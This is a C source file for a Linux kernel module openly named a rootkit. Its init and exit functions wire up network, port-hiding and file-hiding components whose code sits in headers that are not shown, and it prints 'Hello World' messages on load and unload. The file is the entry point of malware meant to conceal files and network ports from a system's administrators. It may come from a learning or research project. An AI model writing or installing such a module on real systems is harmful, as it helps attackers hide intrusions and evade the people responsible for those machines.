#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include "rk_net.h"
#include "rk_hide_port.h"
#include "rk_hide_file.h"

MODULE_LICENSE("GPL");

static int __init rootkit_init(void) {
  rk_net_init();
  rk_hide_port_init();
  rk_hide_file_init();
  printk("rootkit: Hello World\n");
  return 0;
}

static void __exit rootkit_exit(void) {
  rk_net_exit();
  rk_hide_port_exit();
  rk_hide_file_exit();
  printk("rootkit: GoodBye World\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);